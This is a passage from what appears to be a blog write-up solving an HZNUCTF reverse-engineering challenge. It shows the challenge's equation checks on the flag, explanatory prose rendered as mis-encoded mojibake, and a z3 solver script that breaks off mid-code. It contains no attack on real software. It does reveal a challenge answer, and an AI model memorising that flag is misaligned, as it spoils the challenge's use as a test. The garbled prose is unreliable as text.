class="number">19</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">8</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">38</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">16</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">15</span> * i11i1Iii1I1[<span class="number">15</span>] == <span class="number">8257</span>,</span><br><span class="line">         <span class="number">23</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">2</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">3</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">11</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">12</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">24</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">14</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">0</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">68</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">18</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">68</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">26</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">15</span> * i11i1Iii1I1[<span class="number">15</span>] - <span class="number">16</span> * i11i1Iii1I1[<span class="number">16</span>] == <span class="number">5847</span>,</span><br><span class="line">         <span class="number">24</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">1</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">15</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">13</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">4</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">16</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">67</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">146</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">50</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">16</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">1</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">69</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">27</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">45</span> * i11i1Iii1I1[<span class="number">15</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">17</span> * i11i1Iii1I1[<span class="number">17</span>] == <span class="number">18257</span>,</span><br><span class="line">         <span class="number">25</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">26</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">89</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">16</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">19</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">44</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">36</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">150</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">250</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">166</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">126</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">11</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">690</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">207</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">46</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">7</span> * i11i1Iii1I1[<span class="number">17</span>] - <span class="number">18</span> * i11i1Iii1I1[<span class="number">18</span>] == <span class="number">12591</span>,</span><br><span class="line">         <span class="number">5</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">26</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">8</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">160</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">9</span> * i11i1Iii1I1[<span class="number">4</span>] - <span class="number">4</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">36</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">15</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">16</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">1</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">690</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">46</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">7</span> * i11i1Iii1I1[<span class="number">17</span>] - <span class="number">18</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">19</span> * i11i1Iii1I1[<span class="number">19</span>] == <span class="number">52041</span>,</span><br><span class="line">         <span class="number">29</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">26</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">60</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">90</span> * i11i1Iii1I1[<span class="number">4</span>] - <span class="number">4</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">16</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">21</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">69</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">12</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">69</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">14</span>] - <span class="number">46</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">65</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">17</span>] - <span class="number">1</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">39</span> * i11i1Iii1I1[<span class="number">19</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">20</span>] == <span class="number">20253</span>,</span><br><span class="line">         <span class="number">45</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">56</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">10</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">650</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">900</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">44</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">6</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">21</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">9</span> * i11i1Iii1I1[<span class="number">10</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">12</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">69</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">2</span> * i11i1Iii1I1[<span class="number">14</span>] - <span class="number">406</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">651</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">2</span> * i11i1Iii1I1[<span class="number">17</span>] - <span class="number">10</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">69</span> * i11i1Iii1I1[<span class="number">19</span>] - <span class="number">0</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">21</span>] == <span class="number">18768</span>,</span><br><span class="line">         <span class="number">555</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">6666</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">70</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">510</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">90</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">499</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">6</span>] - <span class="number">66</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">610</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">221</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">9</span> * i11i1Iii1I1[<span class="number">10</span>] - <span class="number">23</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">102</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">2050</span> * i11i1Iii1I1[<span class="number">14</span>] - <span class="number">406</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">665</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">333</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">609</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">777</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">201</span> * i11i1Iii1I1[<span class="number">21</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">22</span>] == <span class="number">111844</span>,</span><br><span class="line">         <span class="number">1</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">333</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">4444</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">5555</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">6666</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">666</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">676</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">660</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">9</span> * i11i1Iii1I1[<span class="number">10</span>] - <span class="number">73</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">107</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">250</span> * i11i1Iii1I1[<span class="number">14</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">65</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">39</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">10</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">69</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">777</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">201</span> * i11i1Iii1I1[<span class="number">21</span>] - <span class="number">2</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] == <span class="number">159029</span>,</span><br><span class="line">         <span class="number">520</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">222</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">333</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">4</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">56655</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">6666</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">60</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">220</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">73</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">1007</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">7777</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">2500</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">6666</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">605</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">390</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">609</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">99999</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">210</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">232</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">24</span> * i11i1Iii1I1[<span class="number">24</span>] == <span class="number">2762025</span>,</span><br><span class="line">         <span class="number">1323</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">333</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">4</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">55</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">660</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">220</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">777</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">2500</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">6666</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">605</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">390</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">609</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">9999</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">210</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">232</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">24</span> * i11i1Iii1I1[<span class="number">24</span>] + <span class="number">25</span> * i11i1Iii1I1[<span class="number">25</span>] == <span class="number">1551621</span>,</span><br><span class="line">         <span class="number">777</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">6969</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">4</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">55</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">96</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">60</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">220</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">777</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">250</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">65</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">90</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">609</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">999</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">232</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">24</span> * i11i1Iii1I1[<span class="number">24</span>] + <span class="number">25</span> * i11i1Iii1I1[<span class="number">25</span>] - <span class="number">26</span> * i11i1Iii1I1[<span class="number">26</span>] == <span class="number">948348</span>,</span><br><span class="line">         <span class="number">97</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">6969</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">4</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">56</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">96</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">96</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">60</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">10</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">707</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">250</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">-9</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">90</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">-2</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">609</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">2</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">24</span> * i11i1Iii1I1[<span class="number">24</span>] + <span class="number">25</span> * i11i1Iii1I1[<span class="number">25</span>] - <span class="number">26</span> * i11i1Iii1I1[<span class="number">26</span>] + <span class="number">27</span> * i11i1Iii1I1[<span class="number">27</span>] == <span class="number">777044</span>,</span><br><span class="line">         <span class="number">177</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">699</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">64</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">56</span> * i11i1Iii1I1[<span class="number">4</span>] - <span class="number">96</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">66</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">96</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">60</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">10</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">707</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">250</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">-9</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">-2</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">69</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">222</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">224</span> * i11i1Iii1I1[<span class="number">24</span>] + <span class="number">25</span> * i11i1Iii1I1[<span class="number">25</span>] - <span class="number">26</span> * i11i1Iii1I1[<span class="number">26</span>] + <span class="number">27</span> * i11i1Iii1I1[<span class="number">27</span>] - <span class="number">28</span> * i11i1Iii1I1[<span class="number">28</span>] == <span class="number">185016</span>,</span><br><span class="line">         <span class="number">77</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">2</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">96</span> * i11i1Iii1I1[<span class="number">4</span>] - <span class="number">9</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">96</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">0</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">10</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">707</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">250</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">-9</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">-2</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">9</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">222</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">224</span> * i11i1Iii1I1[<span class="number">24</span>] + <span class="number">26</span> * i11i1Iii1I1[<span class="number">25</span>] - <span class="number">-58</span> * i11i1Iii1I1[<span class="number">26</span>] + <span class="number">27</span> * i11i1Iii1I1[<span class="number">27</span>] - <span class="number">2</span> * i11i1Iii1I1[<span class="number">28</span>] + <span class="number">29</span> * i11i1Iii1I1[<span class="number">29</span>] == <span class="number">130106</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(ii1iIi1i11i):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Congratulation!!!&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;wrong_wrong!!!&quot;</span>)</span><br></pre></td></tr></table></figure><p>æ˜¯è®¡ä¸‹ flag é‡Œé¢æ¯ä¸ªå­—ç¬¦å‡ºç°çš„æ¬¡æ•°æ£€éªŒæ˜¯å¦ç¬¦åˆé‚£ä¸ªå­—ç¬¦ä¸²çš„æ ¼å¼åŒ–çš„å¯¹åº”æ¬¡æ•°ï¼Œ</p><p>å°†ä¸‹é¢çš„ z3 è§£å‡ºå¯ä»¥å¾—åˆ°ä¸€ä¸ªå­—ç¬¦ä¸² <strong>H1Z1N1U1C1T1F1{1a6d275f7-463}</strong></p><p>ä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªæ•°å­—é…å¯¹ï¼Œä»£è¡¨è¯¥å­—ç¬¦åœ¨åŸ flag ä¸­å‡ºç°çš„æ¬¡æ•°ã€‚</p><p>é™¤å»å‰é¢ HZNUCTF{ï¼Œå°†æ‹¬å·å†…çš„å­—æ¯å’Œå¯¹åº”æ•°å­—åšæ˜ å°„ï¼Œåˆ©ç”¨åŸä»£ç ä¸­çš„**â€111111116257645365477364777645752361â€**å»ä¸€ä¸€å¯¹åº”ã€‚</p><p>è§£å¯†ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">_encrypted_</span>):</span><br><span class="line">    mapping = <span class="string">&quot;6257645365477364777645752361&quot;</span></span><br><span class="line">    </span><br><span class="line">    char_map = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    remaining_map = &#123;</span><br><span class="line">        <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;d&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;7&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;f&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    char_map.update(remaining_map)</span><br><span class="line">    </span><br><span class="line">    result = <span class="string">&quot;HZNUCTF&#123;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> mapping:</span><br><span class="line">        result += char_map[num]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">Enc = [Int(<span class="string">f&#x27;x<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>)]</span><br><span class="line"></span><br><span class="line">s.add(<span class="number">7</span> * Enc[<span class="number">0</span>] == <span class="number">504</span>)</span><br><span class="line">s.add(<span class="number">9</span> * Enc[<span class="number">0</span>] - <span class="number">5</span> * Enc[<span class="number">1</span>] == <span class="number">403</span>)</span><br><span class="line">s.add((<span class="number">2</span> * Enc[<span class="number">0</span>] - <span class="number">5</span> * Enc[<span class="number">1</span>]) + <span class="number">10</span> * Enc[<span class="number">2</span>] == <span class="number">799</span>)</span><br><span class="line">s.add(<span class="number">3</span> * Enc[<span class="number">0</span>] + <span class="number">8</span> * Enc[<span class="number">1</span>] + <span class="number">15</span> * Enc[<span class="number">2</span>] + <span class="number">20</span> * Enc[<span class="number">3</span>] == <span class="number">2938</span>)</span><br><span class="line">s.add((<span class="number">5</span> * Enc[<span class="number">0</span>] + <span class="number">15</span> * Enc[<span class="number">1</span>] + <span class="number">20</span> * Enc[<span class="number">2</span>] - <span class="number">19</span> * Enc[<span class="number">3</span>]) + <span class="number">1</span> * Enc[<span class="number">4</span>] == <span class="number">2042</span>)</span><br><span class="line">s.add((<span class="number">7</span> * Enc[<span class="number">0</span>] + <span class="number">1</span> * Enc[<span class="number">1</span>] + <span class="number">9</span> * Enc[<span class="number">2</span>] - <span class="number">11</span> * Enc[<span class="number">3</span>]) + <span class="number">2</span> * Enc[<span class="number">4</span>] + <span class="number">5</span> * Enc[<span class="number">5</span>] == <span class="number">1225</span>)</span><br><span 